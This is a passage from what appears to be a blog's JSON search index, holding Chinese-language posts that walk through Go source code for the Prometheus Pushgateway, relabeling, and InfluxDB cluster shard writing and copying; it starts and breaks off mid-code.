externalPathPrefix)\n\tlevel.Debug(logger).Log(\"msg\", \"path prefix for internal routing\", \"path\", *routePrefix)\n\n\t// flags is used to show command line flags on the status page.\n\t// Kingpin default flags are excluded as they would be confusing.\n\tflags := map[string]string{}\n\tboilerplateFlags := kingpin.New(\"\", \"\").Version(\"\")\n\tfor _, f := range app.Model().Flags {\n\t\tif boilerplateFlags.GetFlag(f.Name) == nil {\n\t\t\tflags[f.Name] = f.Value.String()\n\t\t}\n\t}\n\n\tms := storage.NewDiskMetricStore(*persistenceFile, *persistenceInterval, prometheus.DefaultGatherer, logger)\n\n\t// Create a Gatherer combining the DefaultGatherer and the metrics from the metric store.\n\tg := prometheus.Gatherers{\n\t\tprometheus.DefaultGatherer,\n\t\tprometheus.GathererFunc(func() ([]*dto.MetricFamily, error) { return ms.GetMetricFamilies(), nil }),\n\t}\n\n\tr := httprouter.New()\n\tr.Handler(\"GET\", *routePrefix+\"/-/healthy\", handler.Healthy(ms))\n\tr.Handler(\"GET\", *routePrefix+\"/-/ready\", handler.Ready(ms))\n\tr.Handler(\n\t\t\"GET\", path.Join(*routePrefix, *metricsPath),\n\t\tpromhttp.HandlerFor(g, promhttp.HandlerOpts{\n\t\t\tErrorLog: logFunc(level.Error(logger).Log),\n\t\t}),\n\t)\n\n\tif *enableAdminAPI {\n\t\t// To be consistent with Prometheus codebase and provide endpoint versioning, we use the same path\n\t\t// as Prometheus for its admin endpoints, even if this may feel excesive for just one simple endpoint\n\t\t// this will likely change over time.\n\t\tr.Handler(\"PUT\", *routePrefix+\"/api/v1/admin/wipe\", handler.WipeMetricStore(ms, logger))\n\t}\n\n\t// Handlers for pushing and deleting metrics.\n\tpushAPIPath := *routePrefix + \"/metrics\"\n\tfor _, suffix := range []string{\"\", handler.Base64Suffix} {\n\t\tjobBase64Encoded := suffix == handler.Base64Suffix\n\t\tr.PUT(pushAPIPath+\"/job\"+suffix+\"/:job/*labels\", handler.Push(ms, true, jobBase64Encoded, logger))\n\t\tr.POST(pushAPIPath+\"/job\"+suffix+\"/:job/*labels\", handler.Push(ms, false, jobBase64Encoded, logger))\n\t\tr.DELETE(pushAPIPath+\"/job\"+suffix+\"/:job/*labels\", handler.Delete(ms, jobBase64Encoded, logger))\n\t\tr.PUT(pushAPIPath+\"/job\"+suffix+\"/:job\", handler.Push(ms, true, jobBase64Encoded, logger))\n\t\tr.POST(pushAPIPath+\"/job\"+suffix+\"/:job\", handler.Push(ms, false, jobBase64Encoded, logger))\n\t\tr.DELETE(pushAPIPath+\"/job\"+suffix+\"/:job\", handler.Delete(ms, jobBase64Encoded, logger))\n\t}\n\tr.Handler(\"GET\", *routePrefix+\"/static/*filepath\", handler.Static(asset.Assets, *routePrefix))\n\n\tstatusHandler := handler.Status(ms, asset.Assets, flags, externalPathPrefix, logger)\n\tr.Handler(\"GET\", *routePrefix+\"/status\", statusHandler)\n\tr.Handler(\"GET\", *routePrefix+\"/\", statusHandler)\n\n\t// Re-enable pprof.\n\tr.GET(*routePrefix+\"/debug/pprof/*pprof\", handlePprof)\n\n\tlevel.Info(logger).Log(\"listen_address\", *listenAddress)\n\tl, err := net.Listen(\"tcp\", *listenAddress)\n\tif err != nil {\n\t\tlevel.Error(logger).Log(\"err\", err)\n\t\tos.Exit(1)\n\t}\n\n\tquitCh := make(chan struct{})\n\tquitHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Requesting termination... Goodbye!\")\n\t\tclose(quitCh)\n\t})\n\n\tforbiddenAPINotEnabled := http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {\n\t\tw.WriteHeader(http.StatusForbidden)\n\t\tw.Write([]byte(\"Lifecycle API is not enabled.\"))\n\t})\n\n\tif *enableLifeCycle {\n\t\tr.Handler(\"PUT\", *routePrefix+\"/-/quit\", quitHandler)\n\t\tr.Handler(\"POST\", *routePrefix+\"/-/quit\", quitHandler)\n\t} else {\n\t\tr.Handler(\"PUT\", *routePrefix+\"/-/quit\", forbiddenAPINotEnabled)\n\t\tr.Handler(\"POST\", *routePrefix+\"/-/quit\", forbiddenAPINotEnabled)\n\t}\n\n\tr.Handler(\"GET\", \"/-/quit\", http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {\n\t\tw.WriteHeader(http.StatusMethodNotAllowed)\n\t\tw.Write([]byte(\"Only POST or PUT requests allowed.\"))\n\t}))\n\n\tgo closeListenerOnQuit(l, quitCh, logger)\n\terr = (&http.Server{Addr: *listenAddress, Handler: r}).Serve(l)\n\tlevel.Error(logger).Log(\"msg\", \"HTTP server stopped\", \"err\", err)\n\t// To give running connections a chance to submit their payload, we wait\n\t// for 1sec, but we don't want to wait long (e.g. until all connections\n\t// are done) to not delay the shutdown.\n\ttime.Sleep(time.Second)\n\tif err := ms.Shutdown(); err != nil {\n\t\tlevel.Error(logger).Log(\"msg\", \"problem shutting down metric storage\", \"err\", err)\n\t}\n}\n```\n\n通过push到接口metric传递数据到prometheus，push接口调用push函数去使用。\n\n```go\n// Push returns an http.Handler which accepts samples over HTTP and stores them\n// in the MetricStore. If replace is true, all metrics for the job and instance\n// given by the request are deleted before new ones are stored.\n//\n// The returned handler is already instrumented for Prometheus.\nfunc Push(\n\tms storage.MetricStore, replace bool, jobBase64Encoded bool, logger log.Logger,\n) func(http.ResponseWriter, *http.Request, httprouter.Params) {\n\tvar ps httprouter.Params\n\tvar mtx sync.Mutex // Protects ps.\n\n\thandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n\t\tjob := ps.ByName(\"job\")\n\t\tif jobBase64Encoded {\n\t\t\tvar err error\n\t\t\tif job, err = decodeBase64(job); err != nil {\n\t\t\t\thttp.Error(w, fmt.Sprintf(\"invalid base64 encoding in job name %q: %v\", ps.ByName(\"job\"), err), http.StatusBadRequest)\n\t\t\t\tlevel.Debug(logger).Log(\"msg\", \"invalid base64 encoding in job name\", \"job\", ps.ByName(\"job\"), \"err\", err.Error())\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t\tlabelsString := ps.ByName(\"labels\")\n\t\tmtx.Unlock()\n\n\t\tlabels, err := splitLabels(labelsString)\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\t\tlevel.Debug(logger).Log(\"msg\", \"failed to parse URL\", \"url\", labelsString, \"err\", err.Error())\n\t\t\treturn\n\t\t}\n\t\tif job == \"\" {\n\t\t\thttp.Error(w, \"job name is required\", http.StatusBadRequest)\n\t\t\tlevel.Debug(logger).Log(\"msg\", \"job name is required\")\n\t\t\treturn\n\t\t}\n\t\tlabels[\"job\"] = job\n\n\t\tvar metricFamilies map[string]*dto.MetricFamily\n\t\tctMediatype, ctParams, ctErr := mime.ParseMediaType(r.Header.Get(\"Content-Type\"))\n\t\tif ctErr == nil && ctMediatype == \"application/vnd.google.protobuf\" &&\n\t\t\tctParams[\"encoding\"] == \"delimited\" &&\n\t\t\tctParams[\"proto\"] == \"io.prometheus.client.MetricFamily\" {\n\t\t\tmetricFamilies = map[string]*dto.MetricFamily{}\n\t\t\tfor {\n\t\t\t\tmf := &dto.MetricFamily{}\n\t\t\t\tif _, err = pbutil.ReadDelimited(r.Body, mf); err != nil {\n\t\t\t\t\tif err == io.EOF {\n\t\t\t\t\t\terr = nil\n\t\t\t\t\t}\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\tmetricFamilies[mf.GetName()] = mf\n\t\t\t}\n\t\t} else {\n\t\t\t// We could do further content-type checks here, but the\n\t\t\t// fallback for now will anyway be the text format\n\t\t\t// version 0.0.4, so just go for it and see if it works.\n\t\t\tvar parser expfmt.TextParser\n\t\t\tmetricFamilies, err = parser.TextToMetricFamilies(r.Body)\n\t\t}\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\t\tlevel.Debug(logger).Log(\"msg\", \"failed to parse text\", \"err\", err.Error())\n\t\t\treturn\n\t\t}\n\t\tnow := time.Now()\n\t\terrCh := make(chan error, 1)\n\t\terrReceived := false\n\t\tms.SubmitWriteRequest(storage.WriteRequest{\n\t\t\tLabels:         labels,\n\t\t\tTimestamp:      now,\n\t\t\tMetricFamilies: metricFamilies,\n\t\t\tReplace:        replace,\n\t\t\tDone:           errCh,\n\t\t})\n\t\tfor err := range errCh {\n\t\t\t// Send only first error via HTTP, but log all of them.\n\t\t\t// TODO(beorn): Consider sending all errors once we\n\t\t\t// have a use case. (Currently, at most one error is\n\t\t\t// produced.)\n\t\t\tif !errReceived {\n\t\t\t\thttp.Error(\n\t\t\t\t\tw,\n\t\t\t\t\tfmt.Sprintf(\"pushed metrics are invalid or inconsistent with existing metrics: %v\", err),\n\t\t\t\t\thttp.StatusBadRequest,\n\t\t\t\t)\n\t\t\t}\n\t\t\tlevel.Error(logger).Log(\n\t\t\t\t\"msg\", \"pushed metrics are invalid or inconsistent with existing metrics\",\n\t\t\t\t\"method\", r.Method,\n\t\t\t\t\"source\", r.RemoteAddr,\n\t\t\t\t\"err\", err.Error(),\n\t\t\t)\n\t\t\terrReceived = true\n\t\t}\n\t})\n\n\tinstrumentedHandler := promhttp.InstrumentHandlerRequestSize(\n\t\thttpPushSize, promhttp.InstrumentHandlerDuration(\n\t\t\thttpPushDuration, promhttp.InstrumentHandlerCounter(\n\t\t\t\thttpCnt.MustCurryWith(prometheus.Labels{\"handler\": \"push\"}),\n\t\t\t\thandler,\n\t\t\t)))\n\n\treturn func(w http.ResponseWriter, r *http.Request, params httprouter.Params) {\n\t\tmtx.Lock()\n\t\tps = params\n\t\tinstrumentedHandler.ServeHTTP(w, r)\n\t}\n}\n```\n\n数据push完会放入pushgateway的缓存队列中存储，prometheus通过配置，采用pull的方式拉取数据获取指标。\n\n## relabel\n\nrelabel功能主要是用于实现多数据中心的监控数据聚合。Relabel可以在Prometheus采集数据之前，通过Target实例的Metadata信息，动态重新写入Label的值。relabel可以对Target实例进行过滤和选择。\n\nrelabel实现过程：\n\n```go\n// Process returns a relabeled copy of the given label set. The relabel configurations\n// are applied in order of input.\n// If a label set is dropped, nil is returned.\n// May return the input labelSet modified.\nfunc Process(labels model.LabelSet, cfgs ...*config.RelabelConfig) model.LabelSet {\n\tfor _, cfg := range cfgs {\n\t\tlabels = relabel(labels, cfg)\n\t\tif labels == nil {\n\t\t\treturn nil\n\t\t}\n\t}\n\treturn labels\n}\n```\n\n调用process函数来处理，针对每个配置进行relabel操作。\n\nrelabel函数实现，relabel的类型有：RelabelDrop， RelabelKeep，RelabelReplace，RelabelLabelMap，RelabelLabelDrop，RelabelLabelKeep，RelabelHashMod\n\n```go\nfunc relabel(labels model.LabelSet, cfg *config.RelabelConfig) model.LabelSet {\n\tvalues := make([]string, 0, len(cfg.SourceLabels))\n\tfor _, ln := range cfg.SourceLabels {\n\t\tvalues = append(values, string(labels[ln]))\n\t}\n\tval := strings.Join(values, cfg.Separator)\n\n\tswitch cfg.Action {\n\tcase config.RelabelDrop:\n\t\tif cfg.Regex.MatchString(val) {\n\t\t\treturn nil\n\t\t}\n\tcase config.RelabelKeep:\n\t\tif !cfg.Regex.MatchString(val) {\n\t\t\treturn nil\n\t\t}\n\tcase config.RelabelReplace:\n\t\tindexes := cfg.Regex.FindStringSubmatchIndex(val)\n\t\t// If there is no match no replacement must take place.\n\t\tif indexes == nil {\n\t\t\tbreak\n\t\t}\n\t\ttarget := model.LabelName(cfg.Regex.ExpandString([]byte{}, cfg.TargetLabel, val, indexes))\n\t\tif !target.IsValid() {\n\t\t\tdelete(labels, model.LabelName(cfg.TargetLabel))\n\t\t\tbreak\n\t\t}\n\t\tres := cfg.Regex.ExpandString([]byte{}, cfg.Replacement, val, indexes)\n\t\tif len(res) == 0 {\n\t\t\tdelete(labels, model.LabelName(cfg.TargetLabel))\n\t\t\tbreak\n\t\t}\n\t\tlabels[target] = model.LabelValue(res)\n\tcase config.RelabelHashMod:\n\t\tmod := sum64(md5.Sum([]byte(val))) % cfg.Modulus\n\t\tlabels[model.LabelName(cfg.TargetLabel)] = model.LabelValue(fmt.Sprintf(\"%d\", mod))\n\tcase config.RelabelLabelMap:\n\t\tout := make(model.LabelSet, len(labels))\n\t\t// Take a copy to avoid infinite loops.\n\t\tfor ln, lv := range labels {\n\t\t\tout[ln] = lv\n\t\t}\n\t\tfor ln, lv := range labels {\n\t\t\tif cfg.Regex.MatchString(string(ln)) {\n\t\t\t\tres := cfg.Regex.ReplaceAllString(string(ln), cfg.Replacement)\n\t\t\t\tout[model.LabelName(res)] = lv\n\t\t\t}\n\t\t}\n\t\tlabels = out\n\tcase config.RelabelLabelDrop:\n\t\tfor ln := range labels {\n\t\t\tif cfg.Regex.MatchString(string(ln)) {\n\t\t\t\tdelete(labels, ln)\n\t\t\t}\n\t\t}\n\tcase config.RelabelLabelKeep:\n\t\tfor ln := range labels {\n\t\t\tif !cfg.Regex.MatchString(string(ln)) {\n\t\t\t\tdelete(labels, ln)\n\t\t\t}\n\t\t}\n\tdefault:\n\t\tpanic(fmt.Errorf(\"retrieval.relabel: unknown relabel action type %q\", cfg.Action))\n\t}\n\treturn labels\n}\n```\n\naction=keep, 丢弃指定源标签的标签值没有匹配到regex的target\n\naction=drop，丢弃指定源标签的标签值匹配到regex的target\n\naction=labeldrop，丢弃匹配到regex 的标签\n\naction=labelkeep，丢弃没有匹配到regex 的标签\n\naction=replace，更改标签名、更改标签值、合并标签\n\naction=hashmod，将多个源标签的值进行hash，作为target标签的值\n\naction=labelmap，Regex匹配名->replacement用原标签名的部分来替换名\n\n**replace是缺省action，可以不配置action**\n\n\n\n## 参考资料\n\nhttps://www.jianshu.com/p/c21d399c140a\n\nhttps://blog.csdn.net/luanpeng825485697/article/details/82318204\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["prometheus"]},{"title":"influxdb集群代码分析","url":"/2020/02/17/influxdb 集群代码分析/","content":"\n## influxdb集群代码分析\n\n本文主要分析下influxdb中cluster部分的代码：\n\n入口函数：\n\n```go\nfunc (s *Server) OpenDataServer() error {\n\tif s.TSDBStore != nil && !s.DataServicesOpened {\n\t\ts.DataServicesOpened = true\n\t\t// Append services.\n\t\ts.appendClusterService(s.config.Cluster)   // 增加集群服务注册\n\t\ts.appendMonitorService()\n\t\ts.appendPrecreatorService(s.config.Precreator)\n\t\ts.appendSnapshotterService()\n\t\ts.appendContinuousQueryService(s.config.ContinuousQuery)\n\t\ts.appendAntiEntropyService(s.config.AntiEntropy)\n\t\ts.appendHTTPDService(s.config.HTTPD)\n\t\ts.appendStorageService(s.config.Storage)\n\t\ts.appendRetentionPolicyService(s.config.Retention)\n\t\tfor _, i := range s.config.GraphiteInputs {\n\t\t\tif err := s.appendGraphiteService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.CollectdInputs {\n\t\t\ts.appendCollectdService(i)\n\t\t}\n\t\tfor _, i := range s.config.OpenTSDBInputs {\n\t\t\tif err := s.appendOpenTSDBService(i); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t\tfor _, i := range s.config.UDPInputs {\n\t\t\ts.appendUDPService(i)\n\t\t}\n\n\t\ts.Subscriber.MetaClient = s.MetaClient\n\t\ts.PointsWriter.MetaClient = s.MetaClient\n\t\ts.Monitor.MetaClient = s.MetaClient\n\t\ts.ShardWriter.MetaClient = s.MetaClient\n\t\ts.HintedHandoff.MetaClient = s.MetaClient\n\n\t\ts.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader)\n\t\ts.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader)\n\n\t\t// Configure logging for all services and clients.\n\t\tif s.config.Meta.LoggingEnabled {\n\t\t\ts.MetaClient.WithLogger(s.Logger)\n\t\t}\n\t\ts.TSDBStore.WithLogger(s.Logger)\n\t\tif s.config.Data.QueryLogEnabled {\n\t\t\ts.QueryExecutor.WithLogger(s.Logger)\n\t\t}\n\t\ts.PointsWriter.WithLogger(s.Logger)\n\t\ts.Subscriber.WithLogger(s.Logger)\n\t\ts.HintedHandoff.WithLogger(s.Logger)\n\t\tfor _, svc := range s.Services {\n\t\t\tsvc.WithLogger(s.Logger)\n\t\t}\n\t\ts.SnapshotterService.WithLogger(s.Logger)\n\t\ts.Monitor.WithLogger(s.Logger)\n\n\t\t// Open TSDB store.\n\t\tif err := s.TSDBStore.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open tsdb store: %s\", err)\n\t\t}\n\n\t\t// Open the hinted handoff service\n\t\tif err := s.HintedHandoff.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open hinted handoff: %s\", err)\n\t\t}\n\n\t\t// Open the subscriber service\n\t\tif err := s.Subscriber.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open subscriber: %s\", err)\n\t\t}\n\n\t\t// Open the points writer service\n\t\tif err := s.PointsWriter.Open(); err != nil {\n\t\t\treturn fmt.Errorf(\"open points writer: %s\", err)\n\t\t}\n\n\t\ts.PointsWriter.AddWriteSubscriber(s.Subscriber.Points())\n\n\t\tfor _, service := range s.Services {\n\t\t\tif err := service.Open(); err != nil {             //集群服务启动\n\t\t\t\treturn fmt.Errorf(\"open service: %s\", err)\n\t\t\t}\n\t\t}\n\t\treturn nil\n\n\t}\n\tif s.TSDBStore == nil {\n\t\treturn fmt.Errorf(\"Data server is not enabled\")\n\t}\n\treturn nil\n}\n```\n\n启动集群服务代码：\n\n```go\n// Open opens the network listener and begins serving requests.\nfunc (s *Service) Open() error {\n\n\ts.Logger.Info(\"Starting cluster service\")\n\t// Begin serving conections.\n\ts.wg.Add(1)\n\tgo s.serve()   //启动服务\n\n\ts.CopyShardTaskManager.Logger = s.Logger\n\tgo s.CopyShardTaskManager.WaitForTask()               //等待task任务\n\n\treturn nil\n}\n```\n\nserve函数：\n\n```go\n// serve accepts connections from the listener and handles them.\nfunc (s *Service) serve() {\n\tdefer s.wg.Done()\n\n\tfor {\n\t\t// Check if the service is shutting down.\n\t\tselect {\n\t\tcase <-s.closing:\n\t\t\treturn\n\t\tdefault:\n\t\t}\n\n\t\t// Accept the next connection.\n\t\tconn, err := s.Listener.Accept()            //监听连接请求\n\t\tif err != nil {\n\t\t\tif strings.Contains(err.Error(), \"connection closed\") {\n\t\t\t\ts.Logger.Info(\"cluster service accept error\", zap.Error(err))\n\t\t\t\treturn\n\t\t\t}\n\t\t\ts.Logger.Info(\"accept error\", zap.Error(err))\n\t\t\tcontinue\n\t\t}\n\n\t\t// Delegate connection handling to a separate goroutine.\n\t\ts.wg.Add(1)\n\t\tgo func() {\n\t\t\tdefer s.wg.Done()\n\t\t\ts.handleConn(conn)             //主要处理函数\n\t\t}()\n\t}\n}\n```\n\nhandleConn函数启动：\n\n```go\n// handleConn services an individual TCP connection.\nfunc (s *Service) handleConn(conn net.Conn) {\n\t// Ensure connection is closed when service is closed.\n\tclosing := make(chan struct{})\n\tdefer close(closing)\n\tgo func() {\n\t\tselect {\n\t\tcase <-closing:\n\t\tcase <-s.closing:\n\t\t}\n\t\tconn.Close()\n\t}()\n\n\ts.Logger.Info(\"accept remote connection\", zap.String(\"remoteaddr\", conn.RemoteAddr().String()))\n\tdefer func() {\n\t\ts.Logger.Info(\"close remote connection\", zap.String(\"remoteaddr\", conn.RemoteAddr().String()))\n\t}()\n\tfor {\n\t\t// Read type-length-value.\n\t\ttyp, err := ReadType(conn)     //读取连接的数据类型\n\t\tif err != nil {\n\t\t\tif strings.HasSuffix(err.Error(), \"EOF\") {\n\t\t\t\treturn\n\t\t\t}\n\t\t\ts.Logger.Info(\"unable to read type\", zap.Error(err))\n\t\t\treturn\n\t\t}\n\n\t\t// Delegate message processing by type.\n        //处理不同数据类型\n\t\tswitch typ {\n\t\tcase writeShardRequestMessage:\n\t\t\tbuf, err := ReadLV(conn)\n\t\t\tif err != nil {\n\t\t\t\ts.Logger.Error(\"unable to read length-value\", zap.Error(err))\n\t\t\t\treturn\n\t\t\t}\n\t\t\t//处理写shared请求\n\t\t\tatomic.AddInt64(&s.stats.WriteShardReq, 1)\n\t\t\terr = s.processWriteShardRequest(buf)\n\t\t\tif err != nil {\n\t\t\t\ts.Logger.Info(\"process write shard error\", zap.Error(err))\n\t\t\t}\n            //处理写请求返回\n\t\t\ts.writeShardResponse(conn, err)\n\t\tcase executeStatementRequestMessage:\n\t\t\tbuf, err := ReadLV(conn) // ReadLV reads the length-value from a TLV record.\n\t\t\tif err != nil {\n\t\t\t\ts.Logger.Info(\"unable to read length-value\", zap.Error(err))\n\t\t\t\treturn\n\t\t\t}\n\t\t\t//处理执行\n\t\t\terr = s.processExecuteStatementRequest(buf)\n\t\t\tif err != nil {\n\t\t\t\ts.Logger.Info(\"process execute statement error\", zap.Error(err))\n\t\t\t}\n\t\t\ts.writeShardResponse(conn, err)\n\t\tcase createIteratorRequestMessage:\n\t\t\tatomic.AddInt64(&s.stats.CreateIteratorReq, 1)\n\t\t\ts.processCreateIteratorRequest(conn)  //创建请求的interator\n\t\t\treturn\n\t\tcase fieldDimensionsRequestMessage:\n\t\t\tatomic.AddInt64(&s.stats.FieldDimensionsReq, 1)\n\t\t\ts.processFieldDimensionsRequest(conn)\n\t\t\treturn\n\t\tcase createIteratorCostRequestMessage:\n\t\t\ts.processCreateIteratorCostRequest(conn)\n\t\t\treturn\n\t\tcase mapTypeRequestMessage:\n\t\t\ts.processMapTypeRequest(conn)\n\t\t\treturn\n\t\tcase seriesKeysRequestMessage:\n\t\t\t//s.statMap.Add(seriesKeysReq, 1)\n\t\t\t//atomic.AddInt64(&s.stats.FieldDimensionsReq, 1)\n\t\t\t//s.processSeriesKeysRequest(conn)\n\t\t\treturn\n\t\tcase copyShardRequestMessage:\n\t\t\ts.processCopyShardRequest(conn)   //处理copy shared分片请求\n\t\t\treturn\n\t\tdefault:\n\t\t\ts.Logger.Info(\"cluster service message type not found\", zap.Binary(\"type\", []byte{typ}))\n\t\t}\n\t}\n}\n```\n\nprocessWriteShardRequest函数处理请求写操作，将数据写入shared分片中。\n\n```go\nfunc (s *Service) processWriteShardRequest(buf []byte) error {\n\t// Build request\n\tvar req WriteShardRequest\n\tif err := req.UnmarshalBinary(buf); err != nil {\n\t\treturn err\n\t}\n\n\tpoints := req.Points()\n\tatomic.AddInt64(&s.stats.WriteShardPointsReq, int64(len(points)))\n\terr := s.TSDBStore.WriteToShard(req.ShardID(), points)\n\n\t// We may have received a write for a shard that we don't have locally because the\n\t// sending node may have just created the shard (via the metastore) and the write\n\t// arrived before the local store could create the shard.  In this case, we need\n\t// to check the metastore to determine what database and retention policy this\n\t// shard should reside within.\n\tif err == tsdb.ErrShardNotFound {\n\t\tdb, rp := req.Database(), req.RetentionPolicy()\n\t\tif db == \"\" || rp == \"\" {\n\t\t\ts.Logger.Info(\"drop write request. no database or rentention policy received\", logger.Shard(req.ShardID()))\n\t\t\treturn nil\n\t\t}\n\n\t\terr = s.TSDBStore.CreateShard(req.Database(), req.RetentionPolicy(), req.ShardID(), true)\n\t\tif err != nil {\n\t\t\tatomic.AddInt64(&s.stats.WriteShardFail, 1)\n\t\t\treturn fmt.Errorf(\"create shard %d: %s\", req.ShardID(), err)\n\t\t}\n\n\t\terr = s.TSDBStore.WriteToShard(req.ShardID(), points)\n\t\tif err != nil {\n\t\t\tatomic.AddInt64(&s.stats.WriteShardFail, 1)\n\t\t\treturn fmt.Errorf(\"write shard %d: %s\", req.ShardID(), err)\n\t\t}\n\t}\n\n\tif err != nil {\n\t\tatomic.AddInt64(&s.stats.WriteShardFail, 1)\n\t\treturn fmt.Errorf(\"write shard %d: %s\", req.ShardID(), err)\n\t}\n\n\treturn nil\n}\n```\n\n解析statements请求操作，并执行statement语句：\n\n```go\nfunc (s *Service) processExecuteStatementRequest(buf []byte) error {\n\t// Unmarshal the request.\n\tvar req ExecuteStatementRequest\n\tif err := req.UnmarshalBinary(buf); err != nil {\n\t\treturn err\n\t}\n\n\t// Parse the InfluxQL statement.\n\tstmt, err := influxql.ParseStatement(req.Statement())\n\tif err != nil {\n\t\treturn err\n\t}\n\t//处理不同的删除操作\n\treturn s.executeStatement(stmt, req.Database())\n}\n```\n\nWaitForTask用于同步influxdb节点之间数据\n\n```go\nfunc (t *CopyShardTaskManager) WaitForTask() {\n\tfor {\n\t\tif t.Host == \"\" {\n\t\t\tdataNodes, _ := t.MetaClient.DataNodes()   //获取所有的数据节点\n\t\t\tfor _, nodeInfo := range dataNodes {\n\t\t\t\tif nodeInfo.ID == t.Node.GetDataID() {\n\t\t\t\t\tt.Host = nodeInfo.TCPHost\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tcopyShards := t.MetaClient.CopyShardStatus()   //拷贝需要的shared分片\n\t\ttask := t.findTask(&copyShards)          //寻找task任务\n\t\tif task != nil {\n\t\t\tt.addRuningTask(task)\n\t\t\tgo task.Run()                  //运行同步数据\n\t\t}\n\t\ttime.Sleep(t.IdleSleepSeconds)\n\t}\n}\n```\n\nRun函数运行，task任务执行：\n\n```go\nfunc (tk *CopyShardTask) Run() {\n\tdefer tk.TaskManager.removeRuningTask(tk)   //销毁正在运行的任务\n\n\terr := tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardCopying)  //更新状态\n\tif err != nil {\n\t\ttk.Logger.Warn(\"update copy shard status to copying failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\t//同步数据更新函数\n\terr = tk.doTask()\n\tif err != nil {\n\t\ttk.Logger.Warn(\"do copy shard failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\t//更新copy shared的状态，如果失败，则任务数据同步失败\n\t\terr = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardFailed)\n\t\tif err != nil {\n\t\t\ttk.Logger.Warn(\"update copy shard status to 'failed' failed\",\n\t\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\t\tzap.Error(err))\n\t\t}\n\t\treturn\n\t}\n\t//更新copyshared状态\n\terr = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardSuccess)\n\tif err != nil {\n\t\ttk.Logger.Warn(\"update copy shard status to success failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\n\ttk.Logger.Info(\"update copy shard status to success\",\n\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\tzap.Uint64(\"shardid\", tk.ShardID))\n\n\treturn\n\n}\n```\n\ndoTask函数执行：\n\n```go\nfunc (tk *CopyShardTask) doTask() (err error) {\n\tnodeIDs := make([]uint64, 1)\n\tnodeIDs[0] = tk.SrcNodeID\n\tconn, err := tk.Dialer.DialNode(nodeIDs)    //获取连接\n\tif err != nil {\n\t\ttk.Logger.Warn(\"dial failed to copy shard\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\t// Write request.\n\tif err = EncodeTLV(conn, copyShardRequestMessage, &CopyShardRequest{\n\t\tShardID: tk.ShardID,    //编码写请求\n\t}); err != nil {\n\t\ttk.Logger.Warn(\"copy shard request failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\n\t// Read the response.\n\tvar resp CopyShardResponse\n\tif _, err = DecodeTLV(conn, &resp); err != nil {\n\t\ttk.Logger.Warn(\"copy shard response failed\",\n\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\tzap.Error(err))\n\t\treturn\n\t}\n\ttk.TotalSize = resp.TotalSize\n\tif storeSD := tk.TaskManager.TSDBStore.Shard(tk.ShardID); storeSD == nil {\n\t\tdatabase, policy, _ := tk.TaskManager.MetaClient.ShardOwner(tk.ShardID)\n\t\tif err = tk.TaskManager.TSDBStore.CreateShard(database, policy, tk.ShardID, false); err != nil {   //创建分片\n\t\t\ttk.Logger.Warn(\"create shard failed\",\n\t\t\t\tzap.String(\"database\", database),\n\t\t\t\tzap.String(\"policy\", policy),\n\t\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\t\tzap.Error(err))\n\t\t\treturn\n\t\t}\n\t\n\t} else if _, err = os.Stat(storeSD.Path()); os.IsNotExist(err) {\n\t\tif err = tk.TaskManager.TSDBStore.DeleteShard(tk.ShardID); err != nil {\n\t\t\ttk.Logger.Warn(\"delete shard failed\",\n\t\t\t\tzap.String(\"database\", storeSD.Database()),\n\t\t\t\tzap.String(\"policy\", storeSD.RetentionPolicy()),\n\t\t\t\tzap.Uint64(\"node\", tk.SrcNodeID),\n\t\t\t\tzap.Uint64(\"shardid\", tk.ShardID),\n\t\t\t\tzap.Error(err))\n\t\t\treturn\n\t\t}\n\t\tif err = tk.TaskManager.TSDBStore.CreateShard(storeSD.Database(), storeSD.RetentionPolicy(), tk.ShardID, false); err != nil {\n\t\t\ttk.Logger.Warn(\"create shard failed\",\n\t\t\t\tzap.String(\"database\", 